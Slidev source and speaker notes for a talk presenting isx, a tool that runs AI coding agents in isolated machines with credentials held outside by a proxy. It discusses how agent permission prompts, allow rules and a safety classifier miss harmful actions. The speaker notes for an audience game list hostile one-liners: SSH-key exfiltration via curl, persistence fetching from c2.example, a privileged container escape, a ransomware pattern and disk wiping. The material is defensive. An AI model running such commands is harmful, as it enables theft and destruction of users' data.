---
theme: default
title: isx — Safe machines for AI agents
colorSchema: dark
# Slidev disables text selection by default; we want slide text copyable.
selectable: true
canvasWidth: 1280
aspectRatio: 16/9
transition: fade
fonts:
  sans: Inter
  mono: JetBrains Mono
  weights: '400,500,600,700'
layout: cover
class: glow-accent
---

<div class="wordmark">isx</div>
<div class="subtitle">Safe machines for AI agents</div>
<p class="tagline">A machine for every agent. None of your credentials inside.</p>

---
layout: center
---

<p class="kicker">The promise</p>

<h1 class="statement">Hand the agent a task, <span class="accent">walk away</span>, come back to finished work.</h1>

<p class="lead mt-8">Every part of isx answers a problem you hit in your first days with an agent.<br>Let's start with the first one.</p>

<!--
Spoken intro: "Here's what we were promised." Read the line. "That's the job description of a coding agent. Not a faster autocomplete: you hand it a task, you leave, you come back to finished work. Hold on to that sentence: it's the bar I'll hold everything to today. Every part of isx exists because something got in the way of it. So let's see what gets in the way."
It's the promise, not a wish and not isx's claim: the way agents are sold, and the thing you actually want. The first act is what happens when you take it at its word.
The shape of the talk: why (the week everyone has with an agent), what (a machine of its own), and how it's built: the part for this audience, Quarkus all the way down.
-->

<!--
The yardstick for the whole talk. Then: here's how it actually goes.
-->

---
layout: center
class: divider
---

<div class="ghost">01</div>

# Why: <span class="accent">one agent, on my laptop</span>

<p>A failing test. How hard can it be?</p>

---
clicks: 5
---

## Fix one failing test

<Term scene="fixTest" class="mt-2" />

<!--
Narrate it as it happens: the test run, the dependency check, the re-run, the full suite, the commit. Each prompt is reasonable on its own. Pause on the last line.
Stylised reconstruction of a typical session, not a screenshot of one tool.
-->

---
layout: center
---

<h1 class="statement">You wanted to delegate.<br><span class="warn">You became the approve button.</span></h1>

<p class="note mt-10">Anthropic measured it: Claude Code users approve 93% of permission prompts.</p>

<!--
Source: anthropic.com/engineering/claude-code-auto-mode. At 93%, the prompt has stopped being a decision.
-->

---
clicks: 2
---

## Homer solved this <span class="muted">in 1995</span>

<HomerFrames :show="[0, 1]" :start-at="1" class="mt-2" />

<p v-click="1" class="note pin"><em>The Simpsons</em>, "King-Size Homer" (1995). Homer's job: answering the safety prompts at the nuclear plant.</p>

<!--
Title alone first: let the room guess which Homer (the poet? Homer Simpson? 1995 says it). Click 1: the first frame and the caption. Click 2: the second. Two frames here: he replaces his finger with a stick, then automates it with a drinking bird and goes to the cinema. What he comes back to is held for the end of the game on the next slide.
The frames are fetched by tools/fetch-memes.sh and not committed (the repo is public); without them the slide shows an original drawing.
-->

---
clicks: 2
---

## Your turn: <span class="accent">yes</span> or <span class="danger">no</span>?

<p class="lead">A command every couple of seconds. Shout yes or no. Then watch the drinking bird.</p>

<ApproveLoop class="mt-4" :start-at="1" :stop-at="2" :period-ms="2400" />

<HomerReturn v-click="2" />

<!--
Scoring: Y/N record what the room shouted; a yes to a command nobody should approve turns the chip red and counts in "waved through, to regret later". It lands the allowlist slide's point one slide early: even a room full of people gets sloppy after twenty prompts. Switch it off with :score="false" on <ApproveLoop> if it changes the mood.
Explain the game before the first click: I'll show a command, you shout YES or NO. Click 1 (space / →) starts it. Keys Y and N record what the room shouted for the command on screen, and the bird approves it anyway; the tally counts how often the room said no. Y/N work from the presenter window too. The ordinary and the outrageous are mixed on purpose: after a few, nobody reads them any more, which is the point. Whatever the room shouts, the bird approves it. Let it run for a dozen; click 2 freezes the game and shows what Homer came back to: "Situation critical. Explosion imminent." Then: the next slide is the drinking bird, in Claude Code's terms.
Key to the references, in case one gets a laugh or a question: left-pad (the 2016 npm unpublish that broke builds worldwide) · curl | sudo sh (installer piped into root; .example domains are reserved and point nowhere) · cat id_ed25519 | curl (exfiltrating your SSH key) · echo $AWS_SECRET_ACCESS_KEY (a live secret into the transcript) · npm publish (supply chain, as you) · --author="Linus Torvalds" (forged authorship: the agent should commit as itself) · find / -name "*.pem" (harvesting keys) · youtu.be/dQw4w9WgXcQ (the Rickroll) · crontab @reboot curl c2.example | sh (malware persistence via a command-and-control server) · gh pr merge --admin (bypassing required reviews) · alias sudo='sudo rm -rf /' (booby-trapping the next human) · docker --privileged -v /:/host chroot (the textbook container escape: root on the host) · tar | openssl enc -pass pass:hunter2 && rm -rf (ransomware in one line; hunter2 is the old IRC joke password) · history -c (covering tracks) · dd if=/dev/zero of=/dev/nvme0n1 (zeroing the disk) · shutdown -h now (the agent's logic, concluded).
-->

---
clicks: 7
---

## So you click <span class="warn">"Yes, and don't ask again"</span>

<ul class="rules mt-2" :class="{ real: $clicks >= 6 }">
  <li class="head"><span>it asked</span><span class="why">you thought</span><span class="rule">it saved</span><span class="is">which allows</span></li>
  <li v-click="1"><code>mvn -q test</code><span class="why">it needs to build</span><span class="rule"><code>Bash(mvn *)</code></span><span class="is">any code it wrote, any instructions in dependencies and plugins</span></li>
  <li v-click="2"><code>git commit -am "wip"</code><span class="why">it needs to commit</span><span class="rule"><code>Bash(git commit *)</code></span><span class="is ok">reasonable</span></li>
  <li v-click="3"><code>curl -LO https://download.java.net/…</code><span class="why">it needs a boot JDK</span><span class="rule"><code>Bash(curl *)</code></span><span class="is">sending anything, anywhere</span></li>
  <li v-click="4"><code>docker run -d postgres:17</code><span class="why">Testcontainers</span><span class="rule"><code>Bash(docker run *)</code></span><span class="is">root on your laptop, via the socket</span></li>
  <li v-click="5"><code>rm -rf target/</code><span class="why">it's cleaning up</span><span class="rule"><code>Bash(rm *)</code></span><span class="is">deleting anything you can</span></li>
</ul>

<p v-click="7" class="lead mt-8">Each one made sense at the time. Read back, <span class="danger">it's a security policy far broader than anything you meant to allow.</span></p>

<!--
Build the list slowly: the command it asked about, the reason you said yes, and (a beat later) the rule that got saved: one prefix, every argument. On click 6 the reasons turn into what each rule actually permits.
Rule syntax per code.claude.com/docs/en/permissions: "Yes, and don't ask again" saves a prefix rule, per repository.
Verified against Claude Code 2.1.282 (2026-09-25): the interactive prompt's option reads "Yes, and don't ask again for:" with an editable field pre-filled with a prefix. It keeps the command's first word and at most one following word, and stops at the first flag (docker is allowed one more word). So "mvn -q test" pre-fills "mvn *", "git commit -am" gives "git commit *", "curl -LO …" gives "curl *", "docker run -d …" gives "docker run *", and "rm -rf target/" gives "rm *". You can edit the prefix; the point is that nobody does. (Headless -p mode suggests the exact command instead; this slide is about the interactive prompt.)
If asked: docker run * still covers docker run --privileged -v /:/host, hence "root on your laptop".
-->

---
layout: center
clicks: 2
---

<h1 class="statement">Or you turn on "auto mode", and<br><span class="warn">a second model</span> decides what's safe.</h1>

<p class="lead" style="margin-top: 28px">It's usually right.</p>

<div class="stats autostat" style="margin-top: 44px">
  <div class="stat"><b class="warn">17%</b><span>of real overeager actions get through, per <a href="https://www.anthropic.com/engineering/claude-code-auto-mode" target="_blank">Anthropic</a></span></div>
</div>

<p v-click="1" class="lead" style="margin-top: 36px; font-size: 36px; color: var(--text)">My parachute usually opens.</p>

<p v-click="2" class="lead mt-3" style="font-size: 28px">One time in six, when it matters, it doesn't. <span class="warn">Still jumping?</span></p>

<!--
Be fair: auto mode is a real improvement for interactive work. Anthropic itself calls it "a per-action control, not an isolation boundary".
The parachute, on clicks 1 and 2: Deadpan. Get the wording right: Anthropic's 17% is a miss rate on real overeager actions, i.e. of the actions that genuinely should have been stopped, one in six got through. It is not "17% of the time it fails"; most actions are harmless and never needed stopping. So the parachute fails one time in six when it matters, which for a safety device is the only time that counts. Then ask the room. Then the plain version, spoken: for commands that run as you, on your laptop, "usually" isn't good enough.
Alternative punchline if it suits the room better: "Usually, logging into my bank doesn't empty my savings."
- The classifier is a second model, Sonnet 5 by default, in a separate call that doesn't see tool outputs. When the session also runs Sonnet 5, it is literally another instance of the same model.
- It costs tokens. Every shell command and network call goes to that second model first, with a portion of the transcript, and the answer comes back before the action runs. On the API, Enterprise, Bedrock, Vertex and Foundry accounts those calls count toward token usage. On Pro/Max the review happens server-side and isn't billed separately, but the round trip per action is still there.
- It gives up: after 3 blocks in a row, or 20 in a session, it goes back to prompting you.
Sources: anthropic.com/engineering/claude-code-auto-mode; code.claude.com/docs/en/permission-modes ("Cost and latency"; "Server-side classifier review"); code.claude.com/docs/en/sandbox-environments.
-->

---
clicks: 7
---

## Or a process sandbox, and a task that needs <span class="warn">a real machine</span>

<Term scene="openjdkSandbox" class="mt-2" />

<!--
The story: "I wish I had a patched OpenJDK." Keep the clock in view: 10:00 to 10:36, and you never left your desk. configure stops at the first missing library, so the agent meets them one at a time, each needing sudo. The sandbox confines the commands it runs, but a real task keeps needing things outside it: new hosts, sudo, Docker ("docker is incompatible with the sandbox", per its docs).
Measured: make images takes ~15 minutes with the dependencies in place (2026-09-25). Still to check: the clone, configure and test durations, and that the prompts match what the sandbox really asks.
Source: code.claude.com/docs/en/sandboxing (escape hatch; Troubleshooting: docker; Limitations).
-->

---
layout: center
clicks: 3
---

<h1 class="statement giveup">Fine. <span class="warn">I give up.</span></h1>

<h1 v-click="1" class="statement giveup">Do whatever you want.</h1>

<h1 v-click="2" class="statement giveup"><span class="danger">Just not on my machine.</span></h1>

<h1 v-click="3" class="statement giveup"><span class="accent">Here's one of your own.</span></h1>

<h1 v-click="3" class="statement giveup">Go work. Leave me alone.</h1>

<!--
The turn of the talk. Prompts, allowlists, a second model, a sandbox: every one of them tried to judge the agent's commands one at a time, on your laptop. Say it like someone who has had enough.
Beat by beat: "Fine. I give up." (pause) Click: "Do whatever you want." Click: "Just not on my machine." Click: "Here's one of your own. Go work. Leave me alone."
It's what we already do for people: you don't review a new hire's every command, and you don't hand them your laptop; you give them a machine of their own. The question changes from "may this command run?" to "where does it run?". A sandbox confines what the agent runs; a machine of its own is the thing it runs on.
-->

---
clicks: 4
---

## Meet the isx machine

<IsxBox class="mt-2" />

<!--
Click by click: your laptop and your things; an isx machine appears beside them, inside its container boundary (unprivileged: root inside maps to an unused uid on the host); inside, agentuser has passwordless sudo over its own machine, so it never needs to ask; then the network boundary the host enforces around it: your home and your credentials don't cross (not mounted, never inside), and HTTPS to an intercepted domain carries only a proof, which the proxy checks before adding the real key and sending it on. Be accurate if asked: in the default mode other hosts are reachable directly, there's just nothing inside worth sending; --proxy-only makes the proxy the only way out. Last click: if it breaks its machine, you destroy it and branch another.
Honest limit, for the VM slide: a container shares the host kernel.
-->

---
layout: center
class: divider
---

<div class="ghost">02</div>

# What: <span class="accent">a machine of its own</span>

<p>Whole machines, branched in seconds. No keys inside.</p>

<!--
The "what": start from what everyone already uses for parallel agents, git worktrees, and where they stop. Then a branch is a whole machine, a template declares it, and nothing secret is inside. Then how the work comes back.
-->

---
clicks: 3
---

## You know <span class="muted">git worktrees</span>

<Machines mode="worktrees" class="mt-2" />

<!--
For those who haven't used them: one repository, several branches checked out side by side in separate directories, all sharing one .git. It's how most people run parallel agents today.
Click by click: the repository; three checkouts, and the thing everyone likes about worktrees: they share one .git, so a commit in any checkout can be merged from any other; they all sit on one machine; the collisions.
-->

---
clicks: 5
---

## Two agents, <span class="warn">one ~/.m2</span>

<SnapshotStory class="mt-2" />

<p v-click="5" class="lead mt-3">Nobody touched B's code. The lost afternoon isn't the real cost: <span class="danger">B's evidence is poisoned, and it committed a fix for a bug it never understood.</span></p>

<!--
Tell it as a story, row by row, without explaining. Let the audience wonder why B's numbers move. Only on the last click does the ~/.m2 column light up: A's mvn install overwrote the SNAPSHOT that B's build was using. Dwell on B: it did everything right, collected evidence for two days, and the evidence itself was corrupted. It's now confidently wrong, and so are you if you trust its write-up.
-->

---
layout: center
---

<h1 class="statement">A worktree isolates your checkout.<br><span class="warn">Not the machine it runs on.</span></h1>

<p class="lead mt-8 muted">Ports, services, tools, caches, and yesterday's leftovers: all still shared.</p>

<!--
The worktrees diagram already listed what is shared; this is the one-line wish before the answer. "Yesterday's leftovers" matters: they teach the agent solutions that only work on your laptop.
-->

---
clicks: 3
---

## Every branch is <span class="accent">a whole machine</span>

<Machines mode="isx" class="mt-2" />

<!--
Same picture as the worktrees slide, on purpose: what was one shared machine at the bottom is now inside each box. Each branch has its own ports, ~/.m2, tools, services and IP, starts from the same clean template, and is destroyed rather than cleaned up.
Click 3, the callback to worktrees: you keep the git workflow. Each machine is a git remote of your repository (isx://agent-1/~/shop), so git fetch, git push and git pull work as they do between any two repositories; isx adds and removes the remote for you when host-paths is configured. The details come on "Getting it back is just git".
-->

---



## Branching: <span class="accent">shared, not copied</span>

<McPlayer src="/mc/cow.js" />

<!--
Each square is a block of a machine's disk; the caption at the top narrates each step and the legend says how to read the squares. Git shares objects between branches. isx shares disk blocks between machines: the same trick, one layer down.
Copy-on-write needs a storage pool that supports it (btrfs, ZFS, LVM thin); on one that doesn't, isx branch warns and makes a full copy.
-->

---



## A template <span class="accent">declares the whole machine</span>

<div class="dense">

```yaml {1-3|4-7|8-11|12-15|16-18}
name: tpl-quarkus
description: Quarkus development box
parent: tpl-mydev
tools:
  - podman
  - mvnd
  - claude: {model: claude-sonnet-5-5}
skills:                      # baked into the template
  repo: myorg/claude-skills
  list:
    - code-review
agent_note: |                # added to every agent's briefing
  Prefer mvnd over mvn for repeated builds:
  it takes the same goals and flags.
repos:
  - url: https://github.com/quarkusio/quarkus.git
    prime: mvnd -Dquickly
```

</div>

<p class="note pin">OS, tools, repositories, skills and the agent's briefing in one file, reviewed and versioned like code. Any machine can be rebuilt from it. Not bit for bit: packages and repositories resolve at build time.</p>

<!--
Don't say "deterministic" or "reproducible": the base image tracks the newest release unless pinned (isx update-base <tag>), dnf resolves package versions at build time, and repos are cloned at their current HEAD. What is true: the whole machine is declared in one reviewed file, and rebuilding from it gives the same kind of machine. The TUI flags templates whose definition changed since the last build; isx build --out-of-sync rebuilds them.
-->

---
clicks: 3
---

## What an agent sees <span class="accent">in an isx machine</span>

<Term scene="secretsIsx" class="mt-2" />

<!--
Mirrors the demo script's beat 2: GH_TOKEN is a proof token (gho_isx_…), not a credential: it's worthless outside this machine, and the proxy only adds the real token for a request carrying this machine's proof. gh still authenticates, as the agent's own bot account. (Since v0.5.0; earlier releases showed a static gho_placeholder.) If asked what "from this machine" means: on Linux the proxy checks the proof and the machine's address together; on macOS every container reaches the proxy from the VM's address, so there the proof alone identifies the machine. Either way it's useless to anyone outside isx, and isx account reset-proofs revokes it.
-->

---
clicks: 6
---

## Credentials <span class="accent">never enter</span>

<ProxyFlow class="mt-10" />

<div v-click="6" class="quote news mt-6">Last week: <span class="danger">2,539 secrets in 1,994 public GitHub repositories</span>, written down by "Yes, and don't ask again" in <span class="kw">.claude/settings.local.json</span>, and in committed agent transcripts. On isx there's nothing real to write down: a leaked proof is worthless outside its machine.<cite><a href="https://apiiro.com/blog/coding-agents-leaking-secrets-github-dont-ask-again" target="_blank">Apiiro</a>, 5 November 2026</cite></div>

<!--
Click 6, the news (Apiiro, "coding agents leaking secrets on GitHub", 5 Nov 2026; covered by iTWire, The Hacker News, GBHackers; HN discussion item 50407882): approving a Bash command with "Yes, and don't ask again" saves the whole command as an allow rule in .claude/settings.local.json, credentials included. Apiiro scanned 104,185 public copies (1-3 Nov) and found 1,122 with secrets, 1,379 distinct values; counting git history, the shared settings.json and committed agent transcripts, 2,539 distinct secrets across 1,994 repositories (379 database passwords, 43 SSH logins, 42 GitHub/GitLab/npm tokens, 23 AWS keys). Claude co-authored the commits that changed the file in 539 of 1,105 traced repositories, which doesn't prove it pushed every secret.
Be fair, as with auto mode: Boris Cherny (Claude Code) answered on Hacker News that "historically Claude Code has not done secret scrubbing", that the file is gitignored when Claude creates it (so these copies were checked in by hand; but that ignore goes in your global git excludes, which don't travel with the repository), and that they're prototyping secret scanning.
The isx point: it doesn't depend on scrubbing. Whatever the agent writes down (an allow rule, a transcript, a commit) can only hold the proof token, which the proxy accepts from this machine alone. Honest limit: a secret you paste into the agent yourself is still a secret; isx keeps the credentials it manages out.
Links for the chat: apiiro.com/blog/coding-agents-leaking-secrets-github-dont-ask-again and news.ycombinator.com/item?id=50407882.
If asked what else the one point gives you: --proxy-only drops every outbound packet except to the proxy and DNS (an Incus network ACL enforced on the host, so root inside the machine can't lift it), and --airgap removes the network device; the network-modes slide is in backup.
The token in the chip is a proof, not a placeholder: unique to this machine and credential, worthless anywhere else, and the proxy adds the real key only to a request that carries it (docs/CREDENTIAL-PROOFS.md, v0.5.0). A static placeholder never authorizes anything.
To extend: show the request as an HTTP message with headers, and the x-api-key line rewriting at the proxy; a second pass for git push with a GitHub token.
-->

---
clicks: 4
---

## What comes back: <span class="accent">a commit</span>

<div class="flow mt-6">
  <div class="step">isx machine <b>agent-1</b><span>built and tested from <code>tpl-java</code></span></div>
  <div v-click="1" class="step">commit <b>3f2a91c</b><span>immutable text</span></div>
  <div v-click="2" class="step"><code>git fetch agent-1</code><span><code>git diff</code>: read it like any PR</span></div>
  <div v-click="3" class="step">a fresh branch<span>re-run the tests from the same template</span></div>
  <div v-click="4" class="step">cherry-pick<span>or throw it all away</span></div>
</div>

<p class="note pin">Want to watch it work? Your IDE connects <em>into</em> the machine (JetBrains Gateway, VS Code Remote), so nothing it writes runs on your laptop.</p>

---
clicks: 3
---

## Getting it back is <span class="accent">just git</span>

<Term scene="gitLoop" class="mt-2" />

<!--
Between click 0 and 1: the agent works inside agent-1 and commits. The remote appears when the branch is created and disappears when it's destroyed. What you fetch is a specific commit: it can't change between your review and your cherry-pick. isx's own output lines are paraphrased.
-->

---



## Not just for agents: <span class="accent">someone else's pull request</span>

<p class="lead">A contributor's PR looks harmless. Its build doesn't have to be: every plugin, test and dependency in it <span class="danger">runs as whoever builds it</span>.</p>

<div class="big-code">

```bash
isx branch pr-4812 --from tpl-quarkus
# inside the machine: no keys, nothing of yours
cd ~/quarkus && gh pr checkout 4812 && mvn verify
# back on your laptop, when you're done
isx destroy pr-4812
```

</div>

<p class="lead mt-4">Same for bug reproducers: <span class="accent">a fresh machine per report</span>, thrown away after.</p>

<!--
The message for this audience: isx isn't only for people running agents. Every maintainer who reviews outside contributions runs strangers' build code: Maven plugins, test code, annotation processors, dependencies that run at build time. Today that runs on your laptop, with your keys.
Accurate to isx: isx branch opens a shell in the new machine (if the template's default action starts an agent instead, --shell gives a plain shell). gh inside the machine authenticates through the proxy, as the template's GitHub account (the bot account, if you set one up); the clone at ~/quarkus comes from the template's repos: entry (path: ~/quarkus). If asked about locking it down further: branch with --proxy-only, and the instance's egress reaches only the proxy, its health check and DNS, enforced on the host; github.com and Maven Central are intercepted domains, so gh and mvn still work, and the cache serves what's already been downloaded.
If asked about going further: --airgap removes the network device entirely. Prepare the machine with network first (checkout, mvn dependency:go-offline), then branch it with --airgap (isx branch run-1 --from pr-4812 --airgap) and run only the tests. The dependencies have to be there already.
For code you believe is actively malicious, the template can be built as a VM on Linux (--type vm): its own kernel.
-->

---
clicks: 3
---

## One agent, <span class="accent">coordinating many</span>

<div class="coord mt-4">
  <div class="c-col">
    <div class="c-box you-box"><h4>The coordinator</h4><p>Claude Code on your laptop, or in an isx machine of its own</p></div>
  </div>
  <div class="c-arrow">→</div>
  <div class="c-col">
    <div class="c-box mcp-box"><h4><span class="kw">isx mcp</span></h4>
      <ul>
        <li><b>create_instance</b> from a template, or fork a prepared one</li>
        <li v-click="1"><b>delegate</b> a task · <b>send_message</b> to follow up</li>
        <li v-click="2"><b>wait_any</b> · <b>task_result</b> · <b>get_diff</b></li>
        <li v-click="3"><b>instance_activity</b>: working, or stuck?</li>
      </ul>
    </div>
  </div>
  <div class="c-arrow">→</div>
  <div class="c-col workers">
    <div class="c-box w"><h4>mcp-tpl-quarkus-870-impl</h4><p>Claude Code</p></div>
    <div class="c-box w"><h4>mcp-tpl-quarkus-870-review</h4><p>Codex</p></div>
    <div class="c-box w"><h4>mcp-tpl-quarkus-871-spike</h4><p>Pi</p></div>
  </div>
</div>

<p class="note pin">Each worker runs with full access and no turn limit inside its machine: the machine is the boundary. A long log never fills the coordinator's context: <span class="kw">ask</span> "which tests fail?", and a model reads it inside the machine.</p>

<!--
The five agents from the start of the talk, without you switching between them: one agent coordinates, isx gives it the tools. Set up by isx init (off by default), or by hand: claude mcp add --scope user isx -- isx mcp. In Claude Code it also brings a prompt, /mcp__isx__coordinate.
Click by click, from docs/MCP.md "The tools": create_instance (a fresh branch of an approved template; with from_instance, a fork of a stopped one: prepare once, fork many); click 1, delegate gives an instruction or an installed skill to Claude Code, Codex or Pi inside a machine, and send_message continues that conversation ("push and open a PR"); click 2, wait_any waits for whichever task finishes first, task_result reads the report, get_diff returns a patch, never touching your checkout; click 3, instance_activity reads what the proxy counted of the machine's model calls and traffic: the Activity card from the "one point" slide, put to work.
The worker can be any of the three, whichever the coordinator is. Claude runs in bypassPermissions, Codex in danger-full-access, Pi with every tool: no prompts, because nothing of yours is inside.
ask: a one-shot Claude Code on the summary model reads the output inside the instance and answers. It's a model's reading, so anything that gates a merge stays deterministic: get_diff with stat, CI, a reviewer.
Names: mcp-<template>-<hint>-<suffix>; isx list shows an MCP column (held: #870 implement, orphaned, kept). isx shell <instance> --task joins a delegate's conversation where it left off.
-->

---



## Set it up: <span class="accent">two files, your rules</span>

<div class="setup mt-2">
  <div class="s-col">
    <h4><span class="n">1</span> Register it, on your laptop</h4>

```bash
claude mcp add --scope user isx -- isx mcp
```

<p><span class="kw">isx init</span> offers to do this for you. Off by default.</p>
  </div>
  <div class="s-col">
    <h4><span class="n">2</span> Approve templates</h4>

```yaml
# ~/.config/incus-spawn/mcp.yaml
templates: [tpl-quarkus]
max-instances: 8
host-tools:
  ci-status:
    command: ~/bin/ci-status.sh
    description: CI status of my PRs
```

<p>No agent can write this file. Nothing listed, nothing allowed; the only host commands are the ones you name here.</p>
  </div>
  <div class="s-col">
    <h4><span class="n">3</span> Optional: a coordinator in a machine</h4>

```yaml
# a template of yours
name: tpl-coordinator
# it can read the code too
parent: tpl-quarkus
coordinator:
  control-over: [tpl-quarkus]
```

<p>It controls only what both files name, and acts as your bot, not as you.</p>
  </div>
</div>

<p class="note pin">Every call is logged, credentials scrubbed, to <span class="kw">~/.local/state/incus-spawn/mcp.log</span>. A diff comes back as a patch: your checkout is never touched. Not only MCP: <span class="kw">isx branch --owner</span> with <span class="kw">--format=json</span>, herdr and Orca.</p>

<!--
Actionable on purpose: the three things to do, in the order you'd do them. Step 3's branch: isx branch coord --from tpl-coordinator --proxy-only (every branch of a template with control-over is a coordinator; --no-mcp-client makes a plain one). Inside it, Claude Code finds the server registered as isx, and the prompt /mcp__isx__coordinate.
What it still can't do, if asked: pick templates you didn't list; choose its own network mode, accounts or resources (template defaults, no choices); run anything on your host except host-tools, whose command string it can't influence.
Source: docs/MCP.md, "Approving templates: mcp.yaml", "What an agent gets", "A coordinator in an instance", "Orphans and adoption".
mcp.yaml is read on every call, and isx mcp has no way to write it; a missing or empty file approves nothing. A coordinator in an instance (isx branch coord --from tpl-dev --proxy-only --mcp-client) reaches the server at https://mcp.isx.internal/mcp through the proxy, acts with the instance's credentials (a bot's GitHub login) instead of yours, and controls only the intersection of mcp.yaml's templates and its own template's coordinator.control-over. So mcp.yaml stays your ceiling for every agent.
Never a project-local (.incus-spawn/) template, never an unbuilt one: the agent is told to ask you to run isx build.
Audit: ~/.local/state/incus-spawn/mcp.log. Limits: max-instances (8) and max-concurrent-tasks (8) per host user, "a safety net against runaway creation, not a budget". Orphans: an ended session's instances can be taken back with adopt_instance; unadopted ones are destroyed after orphan-grace-hours (24), never while you're in one or its delegate still works, never once kept.
Text coming back from an instance is data produced inside the sandbox, and the tool descriptions tell the host agent to treat it that way.
-->

---
layout: center
class: divider
---

<div class="ghost">03</div>

# How it's built: <span class="accent">Quarkus all the way down</span>

<p>Two native binaries, a Vert.x proxy, and a beta in production.</p>

---
clicks: 1
---

## Six problems, <span class="accent">six choices</span>

<Blueprint :stage="6" :from="6" reveal class="mt-2" />

<!--
The whole picture at once, as the bridge from what to how: each part answers a problem, and the rest of the talk is how those parts are built. Click: "This is isx." Then: let's open it up.
-->

---



## Two native binaries, <span class="accent">three modules</span>

<div class="cards three equal mt-4 modules">
  <div class="card"><h4><span class="kw">isx</span> · cli</h4><p>Quarkus, with <a href="https://github.com/aeshell/aesh">Aesh</a> for the commands and <a href="https://tamboui.dev/">Tamboui</a> for the TUI, on Panama. The Incus REST client, the git remote helper, <span class="kw">isx mcp</span>.</p><div class="tune"><b>short-lived:</b> serial GC · MaxRAM 512m · 2 CPUs · -O3 + PGO</div></div>
  <div class="card"><h4>common</h4><p>Not a Quarkus app: a Jandex index, so both apps discover its CDI beans. Templates, tools, accounts, configuration, all read with jjq.</p><div class="tune"><b>no binary:</b> compiled into both, tuned by each</div></div>
  <div class="card"><h4><span class="kw">isx-proxy</span></h4><p>Quarkus and Vert.x 5 on Netty 4.2: the MITM TLS proxy, the credential proofs, the caches. A service: systemd on Linux, launchd on macOS.</p><div class="tune"><b>long-running:</b> G1 on Linux, serial on macOS · MaxRAM 256m · 4 CPUs · -O3 + PGO</div></div>
</div>

<div class="built-on logos mt-6">
  <img src="/logos/quarkus.svg" alt="Quarkus" class="word"><img src="/logos/graalvm.png" alt="GraalVM" class="word"><span class="tech"><img src="/logos/java.svg" alt="Java" class="mark"><span>Java 25</span></span><span class="tech"><img src="/logos/incus.png" alt="Incus" class="mark"><span>Incus</span></span><span class="tech"><img src="/logos/tamboui.svg" alt="Tamboui" class="mark"><span>Tamboui</span></span>
</div>

<p class="note pin">Both are built for <span class="kw">-march=haswell</span> or <span class="kw">armv8.1-a+aes</span>: GraalVM's default targets leave out AES, and TLS through the proxy ran <span class="accent">up to 13× slower</span>. Splitting the proxy out took Vert.x out of the CLI: each binary carries only what it runs.</p>

<!--
Replaces the old "Built on" slide: the same thanks, now attached to what each part does. Sources: the three poms (cli: quarkus-arc, aesh, tamboui-panama-backend; proxy: quarkus-arc, quarkus-vertx; common: quarkus-core, Jandex plugin) and design/native-image.md "Module Structure".
The tuning follows the workload: the CLI lives for milliseconds, so serial GC and a small heap; the proxy runs for days under load, so G1 on Linux. On macOS the proxy stays on serial: G1 was measured on Apple Silicon and bought nothing (118 req/s either way on the Maven load) while costing 9 MB of binary and 5.4 MB of idle RSS (#1140); it also needs Oracle GraalVM, which Homebrew's GraalVM CE lacks. Both -O3 with PGO in release builds (later slide). MaxRAM and ActiveProcessorCount are fixed at build time (-R:), from each module's application.properties.
The -march story (design/native-image.md, "Native image CPU baseline"): GraalVM's x86-64-v3 default has no AES-NI or CLMUL, so AES-GCM ran in software: a cached Maven artifact served at 73 MB/s with the default, 960 MB/s with haswell (x86-64-v4 is a trap: AVX-512, still no AES). On Apple Silicon, armv8.1-a+aes took the proxy from 118 to about 1,000 req/s (#1144). -H:RuntimeCheckedCPUFeatures doesn't cover the crypto intrinsics, and aarch64 has no runtime dispatch at all: it's -march or nothing.
Quarkus 4.0.0.Beta3, GraalVM 25, Java 25.
Say thank you here: isx exists because the Incus, Quarkus, GraalVM, Tamboui and Aesh communities built the hard parts.
-->

---
clicks: 3
---

## The architecture, <span class="accent">on Linux</span>

<Arch platform="linux" class="mt-1 arch-fit" />

<p class="note pin">Our own Fedora 45 images: a container rootfs, and for <span class="kw">--type vm</span> an image built around <span class="accent">isx's own kernel</span>, started by the firmware directly. No boot loader, no initrd: 2.4 s to boot, against 6.0 s from the stock image.</p>

<!--
Click 1: the CLI and TUI talk to the Incus daemon's REST API over its unix socket; Incus CoW-copies templates into branches on a btrfs pool.
Click 2: a machine's HTTPS to intercepted domains resolves to the bridge gateway (dnsmasq), is redirected to isx-proxy, which adds the real credentials and forwards upstream.
Click 3: git reaches a machine through Incus exec over a WebSocket.
The images (footer): github.com/Sanne/incus-spawn-images builds them, Fedora 45, both architectures, with checksums verified against the signed release. The container image is a Fedora rootfs bootstrapped with dnf --installroot, agentuser and the network setup baked in, no kernel (containers share the host's). The VM image is built from scratch: a GPT with two partitions, the ESP holding one file, the kernel as EFI/BOOT/BOOTX64.EFI with its command line built in; root found by partition label, so no initrd and no udev at boot; 2.4 s to basic.target against 6.0 s for the old image built from the stock Incus one. dnf in it refuses kernel packages: the kernel only changes when isx bumps its pin. VMs are Linux-only.
-->

---
clicks: 3
---

## The architecture, <span class="accent">on macOS</span>

<Arch platform="macos" class="mt-1 arch-fit" />

<p class="note pin">Our own appliance: Alpine, a kernel built from kernel.org with every driver built in and no initrd, and an <span class="kw">incusd</span> rebuilt with an upstream fix. The same kernel version as the Linux VMs: 7.3.3.</p>

<!--
isx provisions a small Linux appliance: Alpine, a custom kernel with every driver built in, no initrd, no SSH, started by vfkit on Apple's Virtualization framework. The footer, if asked: the kernel is built from vanilla kernel.org source (appliance/kernel/build-kernel.sh), about 5 MB gzipped to download; incusd is rebuilt from Alpine's own Incus release plus one upstream commit (lxc/incus@2cb2549: a client that sent fewer than 8 bytes could stall every API request behind it, #1313). Appliance and VM kernel both at 7.3.3 in v0.5.0.
Click 1: the CLI reaches Incus through a vsock tunnel (vm.incus.sock → virtio-vsock → socat → Incus). Why vsock: corporate VPN clients (e.g. Cisco AnyConnect) install socket filters that block unsigned binaries from TCP to the VM subnet; AF_VSOCK isn't TCP.
Click 2: the proxy runs on the Mac (launchd); the VM DNATs port 443 from the bridge to the Mac's :18443.
Click 3: a second vsock channel reaches isx-agent, a tiny shell agent that only accepts a fixed list of verbs (ping, version, socat-count, sshd-status, forwarder-restart, shutdown, btrfs-usage, btrfs-status, btrfs-rescan, btrfs-orphan-delete), never arbitrary commands. Three users: the automatic recovery in VmManager.recoverReachability() and isx doctor both compare host-side fds with the in-VM socat count to find a wedged forwarder and restart it, even when the Incus channel is stuck; and because the btrfs pool lives inside the VM, the TUI's pool-usage figures come through its btrfs-usage verb (on Linux the same read is a scoped sudoers rule instead).
Sources: DESIGN.md (Incus Daemon Connection, macOS vsock robustness), appliance/DESIGN.md (Boot Backends, First-Boot Initialization, Control agent).
-->

---



## The proxy: <span class="accent">a Vert.x 5 MITM server</span>

<ol class="steps mt-2">
